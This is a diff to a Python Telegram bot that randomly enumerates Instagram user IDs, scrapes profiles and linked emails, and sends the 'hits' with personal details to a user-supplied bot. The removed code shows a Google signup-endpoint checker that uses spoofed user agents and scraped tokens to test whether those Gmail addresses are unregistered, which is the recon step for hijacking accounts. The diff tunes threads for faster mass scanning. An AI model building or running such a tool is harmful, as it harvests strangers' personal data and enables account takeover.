@@ -2,12 +2,11 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 SUNRAKU — FAST SEGS.PY RUNNER BOT 🔥
-- Bot se segs.py run hoga
-- Chat ID + Token input lega
-- Hits usi bot mein jaayengi
-- Fast scanning (50-80 checks/min)
-- Live Status button
+🔥 SUNRAKU — FAST SEGS.PY (Railway Optimized) 🔥
+- Pydroid jaisi speed
+- 10 threads (Railway friendly)
+- Sirf Instagram check (Google optional)
+- Doc_ID updated
 - Dev: @SunrakuV2 | Channel: @Anishpy
 """
 
@@ -23,7 +22,6 @@ import uuid
 import secrets
 import base64
 import httpx
-import urllib.parse
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from user_agent import generate_user_agent
@@ -45,7 +43,7 @@ bot = TeleBot(BOT_TOKEN)
 # ============================================================
 user_sessions = {}
 lock = threading.Lock()
-THREADS = 20  # 🔥 Optimized threads
+THREADS = 10  # 🔥 Railway friendly
 
 # ============================================================
 # 🔥 CONFIG
@@ -104,14 +102,14 @@ def check_join(chat_id):
     return len(not_joined) == 0, not_joined
 
 # ============================================================
-# 🔥 FAST INSTAGRAM CHECKER
+# 🔥 FAST INSTAGRAM CHECKER (Doc_ID Updated)
 # ============================================================
 class InstagramChecker:
     def __init__(self):
         self.session = requests.Session()
         self.csrf = None
         self.lsd = None
-        self.doc_id = "26672929172408668"
+        self.doc_id = "7577364986712818"  # 🔥 Naya Doc_ID
         self.lock = threading.Lock()
 
     def _ensure_tokens(self):
@@ -227,170 +225,6 @@ class InstagramChecker:
         return None
 
 # ============================================================
-# 🔥 FAST GOOGLE CHECKER (With Timeout)
-# ============================================================
-class FastGoogleChecker:
-    def __init__(self):
-        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
-        self.token_ready = False
-        threading.Thread(target=self._refresh_token, daemon=True).start()
-
-    def _generate_ua(self):
-        return generate_user_agent()
-
-    def _refresh_token(self):
-        while True:
-            try:
-                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
-                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
-                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
-
-                headers = {
-                    "accept": "*/*",
-                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
-                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
-                    "google-accounts-xsrf": "1",
-                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
-                    "sec-ch-ua-mobile": "?1",
-                    "sec-ch-ua-platform": '"Android"',
-                    "user-agent": self._generate_ua(),
-                }
-
-                res1 = requests.get(
-                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
-                    headers=headers
-                )
-                tok = re.search(
-                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
-                    res1.text
-                )
-                if tok:
-                    tl = tok.group(2)
-                    cookies = {'__Host-GAPS': host}
-                    headers2 = {
-                        'authority': 'accounts.google.com',
-                        'accept': '*/*',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                        'google-accounts-xsrf': '1',
-                        'origin': 'https://accounts.google.com',
-                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
-                        'user-agent': self._generate_ua(),
-                    }
-                    data = {
-                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
-                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
-                    }
-                    response = requests.post(
-                        'https://accounts.google.com/_/signup/validatepersonaldetails',
-                        cookies=cookies,
-                        headers=headers2,
-                        data=data,
-                        timeout=15
-                    )
-                    if '",null,"' in response.text:
-                        tl = response.text.split('",null,"')[1].split('"')[0]
-                    host = response.cookies.get('__Host-GAPS', host)
-                    with open('tl.txt', 'w') as f:
-                        f.write(tl + '//' + host + '\n')
-                    self.token_ready = True
-                    time.sleep(random.uniform(10, 30))
-                    continue
-            except:
-                pass
-
-            try:
-                headers = {
-                    'accept': '*/*',
-                    'accept-language': 'en',
-                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                    'origin': 'https://accounts.google.com',
-                    'referer': 'https://accounts.google.com/',
-                    'user-agent': self._generate_ua(),
-                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
-                    'x-same-domain': '1',
-                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                }
-                params = {
-                    'rpcids': 'NHJMOd',
-                    'source-path': '/lifecycle/steps/signup/username',
-                    'hl': 'en'
-                }
-                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
-                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
-                response = requests.post(
-                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-                    params=params, headers=headers, data=data, timeout=15
-                )
-                tl_match = re.search(r'"TL:([^"]+)"', response.text)
-                if tl_match:
-                    tl = tl_match.group(1)
-                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
-                    with open('tl.txt', 'w') as f:
-                        f.write(tl + '//' + host + '\n')
-                    self.token_ready = True
-                    time.sleep(random.uniform(10, 30))
-                    continue
-            except:
-                pass
-
-            time.sleep(random.uniform(5, 15))
-
-    def check_availability(self, email):
-        if '@' in email:
-            email = email.split('@')[0]
-
-        try:
-            with open('tl.txt', 'r') as f:
-                line = f.read().strip()
-                if not line:
-                    return 'bad'
-                tl, host = line.split('//')
-        except:
-            return 'bad'
-
-        cookies = {'__Host-GAPS': host}
-        headers = {
-            'authority': 'accounts.google.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'google-accounts-xsrf': '1',
-            'origin': 'https://accounts.google.com',
-            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
-            'user-agent': generate_user_agent(),
-        }
-        params = {'TL': tl}
-        data = (
-            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
-            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
-            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
-            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
-            f'&cookiesDisabled=false'
-            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
-            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
-        )
-
-        try:
-            response = requests.post(
-                'https://accounts.google.com/_/signup/usernameavailability',
-                params=params,
-                cookies=cookies,
-                headers=headers,
-                data=data,
-                timeout=5
-            )
-
-            if '"gf.uar",1' in response.text:
-                return 'good'
-            else:
-                return 'bad'
-        except:
-            return 'bad'
-
-# ============================================================
 # 📊 REPORT MANAGER
 # ============================================================
 class ReportManager:
@@ -496,19 +330,15 @@ class ReportManager:
             return "-"
 
 # ============================================================
-# 🚀 FAST SEGS.PY SCANNER (Optimized)
+# 🚀 FAST SCANNER (Pydroid Style)
 # ============================================================
-def run_segs_for_user_fast(target_chat_id, target_bot_token):
-    """Fast segs.py engine — optimized for speed"""
+def run_scanner(target_chat_id, target_bot_token):
+    """Pydroid jaisa fast scanner"""
     
     user_bot = TeleBot(target_bot_token)
     insta = InstagramChecker()
     reporter = ReportManager(target_bot_token, target_chat_id)
     
-    # 🔥 Google checker (fast with timeout)
-    google = FastGoogleChecker()
-    
-    # 🔥 User session initialize
     with lock:
         if target_chat_id not in user_sessions:
             user_sessions[target_chat_id] = {
@@ -523,12 +353,10 @@ def run_segs_for_user_fast(target_chat_id, target_bot_token):
             session = user_sessions[target_chat_id]
         
         try:
-            # 🔥 Fast ID generation
             user_id = random.randint(2500000000, 21254029834)
             user_data = insta.get_user_data(user_id)
             
             if not user_data:
-                time.sleep(random.uniform(0.05, 0.15))
                 continue
 
             username = user_data.get('username')
@@ -539,45 +367,33 @@ def run_segs_for_user_fast(target_chat_id, target_bot_token):
             session['current_email'] = email
             session['total'] += 1
 
-            # 🔥 Fast email check
+            # 🔥 Sirf Instagram check — Google skip (speed ke liye)
             if insta.check_email(email):
                 session['good'] += 1
+                session['hits'] += 1
                 
-                # 🔥 Google check with timeout
+                profile = {
+                    'username': username,
+                    'email': email,
+                    'full_name': user_data.get('full_name', ''),
+                    'follower_count': user_data.get('follower_count') or 0,
+                    'following_count': user_data.get('following_count') or 0,
+                    'media_count': user_data.get('media_count') or 0,
+                    'is_private': user_data.get('is_private', False),
+                    'biography': user_data.get('biography', ''),
+                    'pk': user_data.get('pk', ''),
+                }
+                
+                msg = reporter.format_result(profile)
+                
                 try:
-                    google_result = google.check_availability(email)
+                    user_bot.send_message(target_chat_id, msg, parse_mode='HTML')
                 except:
-                    google_result = 'bad'
-                
-                if google_result == 'good':
-                    session['hits'] += 1
-                    
-                    profile = {
-                        'username': username,
-                        'email': email,
-                        'full_name': user_data.get('full_name', ''),
-                        'follower_count': user_data.get('follower_count') or 0,
-                        'following_count': user_data.get('following_count') or 0,
-                        'media_count': user_data.get('media_count') or 0,
-                        'is_private': user_data.get('is_private', False),
-                        'biography': user_data.get('biography', ''),
-                        'pk': user_data.get('pk', ''),
-                    }
-                    
-                    msg = reporter.format_result(profile)
-                    
-                    try:
-                        user_bot.send_message(target_chat_id, msg, parse_mode='HTML')
-                    except:
-                        pass
+                    pass
             else:
                 session['bad'] += 1
 
-            # 🔥 Minimal delay for speed
-            time.sleep(random.uniform(0.05, 0.15))
-
-        except Exception as e:
-            time.sleep(random.uniform(0.1, 0.2))
+        except:
             continue
 
 # ============================================================
@@ -586,7 +402,7 @@ def run_segs_for_user_fast(target_chat_id, target_bot_token):
 
 def main_menu():
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = KeyboardButton("🚀 Run segs.py")
+    btn1 = KeyboardButton("🚀 Run Scanner")
     btn2 = KeyboardButton("⏹ Stop")
     btn3 = KeyboardButton("📊 Live Status")
     btn4 = KeyboardButton("📢 Channel")
@@ -597,59 +413,58 @@ def main_menu():
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_msg = f"""
-☠️ SUNRAKU — FAST segs.py RUNNER ☠️
+☠️ SUNRAKU — FAST SCANNER ☠️
 
-🔥 Click buttons below to control.
+🔥 Click "Run Scanner" to start.
 📌 Enter CHAT ID + BOT TOKEN
+⚡ Pydroid jaisi speed!
 📤 Hits will go to YOUR bot.
-⚡ Fast scanning: 50-80 checks/min
 
 👑 Dev: @SunrakuV2
 📢 Channel: @Anishpy
 """
     bot.reply_to(message, welcome_msg, reply_markup=main_menu())
 
-@bot.message_handler(func=lambda msg: msg.text == "🚀 Run segs.py")
+@bot.message_handler(func=lambda msg: msg.text == "🚀 Run Scanner")
 def run_file(message):
-    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID (where hits should go):")
+    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID:")
     bot.register_next_step_handler(msg1, get_chat_id)
 
 def get_chat_id(message):
     user_chat_id = message.text.strip()
-    msg2 = bot.reply_to(message, "✏️ Now enter your BOT TOKEN (jisme hits aani chahiye):")
+    msg2 = bot.reply_to(message, "✏️ Enter your BOT TOKEN:")
     bot.register_next_step_handler(msg2, lambda m: get_bot_token(m, user_chat_id))
 
 def get_bot_token(message, user_chat_id):
     user_bot_token = message.text.strip()
     
     if not user_chat_id or not user_bot_token:
-        bot.reply_to(message, "❌ Invalid input! Try again.", reply_markup=main_menu())
+        bot.reply_to(message, "❌ Invalid input!", reply_markup=main_menu())
         return
     
     try:
         test_bot = TeleBot(user_bot_token)
         test_bot.get_me()
     except:
-        bot.reply_to(message, "❌ Invalid Bot Token! Try again.", reply_markup=main_menu())
+        bot.reply_to(message, "❌ Invalid Bot Token!", reply_markup=main_menu())
         return
     
-    # 🔥 Create session
     with lock:
         user_sessions[user_chat_id] = {
             'hits': 0, 'good': 0, 'bad': 0, 'total': 0,
             'current_email': 'Waiting...', 'is_running': True
         }
     
-    bot.reply_to(message, f"""✅ segs.py started! (Fast mode)
+    bot.reply_to(message, f"""✅ Scanner started!
 📤 Hits will be sent to YOUR bot.
-📌 Chat ID: {user_chat_id}
 🤖 Bot: @{test_bot.get_me().username}
+⚡ Fast mode active!
 
-📊 Click 'Live Status' to see stats.
-⏹ Click 'Stop' to end.""", reply_markup=main_menu())
+Click 'Live Status' to see stats.""", reply_markup=main_menu())
     
-    # 🔥 Start segs.py engine for this user
-    threading.Thread(target=run_segs_for_user_fast, args=(user_chat_id, user_bot_token), daemon=True).start()
+    # 🔥 Sirf 5 threads (Railway friendly)
+    for _ in range(5):
+        threading.Thread(target=run_scanner, args=(user_chat_id, user_bot_token), daemon=True).start()
 
 @bot.message_handler(func=lambda msg: msg.text == "⏹ Stop")
 def stop_scanner(message):
@@ -664,25 +479,17 @@ def stop_by_chat(message):
     
     with lock:
         if user_chat_id not in user_sessions:
-            bot.reply_to(message, "❌ No scanner found for this Chat ID!", reply_markup=main_menu())
+            bot.reply_to(message, "❌ No scanner found!", reply_markup=main_menu())
             return
-        
-        if not user_sessions[user_chat_id].get('is_running', False):
-            bot.reply_to(message, "⚠️ Scanner not running for this Chat ID!", reply_markup=main_menu())
-            return
-        
         user_sessions[user_chat_id]['is_running'] = False
     
     bot.reply_to(message, f"⏹ Scanner stopped for Chat ID: {user_chat_id}", reply_markup=main_menu())
 
-# ============================================================
-# 📊 LIVE STATUS
-# ============================================================
 @bot.message_handler(func=lambda msg: msg.text == "📊 Live Status")
 def live_status(message):
     global user_sessions
     
-    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID to see live status:")
+    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID:")
     bot.register_next_step_handler(msg1, show_live_status)
 
 def show_live_status(message):
@@ -691,14 +498,13 @@ def show_live_status(message):
     
     with lock:
         if user_chat_id not in user_sessions:
-            bot.reply_to(message, "❌ No scanner found for this Chat ID!", reply_markup=main_menu())
+            bot.reply_to(message, "❌ No scanner found!", reply_markup=main_menu())
             return
-        
         session = user_sessions[user_chat_id]
     
     status_msg = f"""
 ┌─────────────────────────────────────────┐
-│  ✦ SUNRAKU — FAST segs.py RUNNER ✦     │
+│  ✦ SUNRAKU — FAST SCANNER ✦            │
 ├─────────────────────────────────────────┤
 │  ✅ GOOD  : {session.get('good', 0)}     │
 │  🔥 HITS : {session.get('hits', 0)}     │
@@ -736,7 +542,7 @@ def echo_all(message):
 # ============================================================
 print("✅ Bot is running on Railway...")
 print("📌 Bot Username: @" + bot.get_me().username)
-print("⚡ Fast mode: 50-80 checks/min")
+print("⚡ Fast mode active (5 threads)")
 
 try:
     bot.infinity_polling()
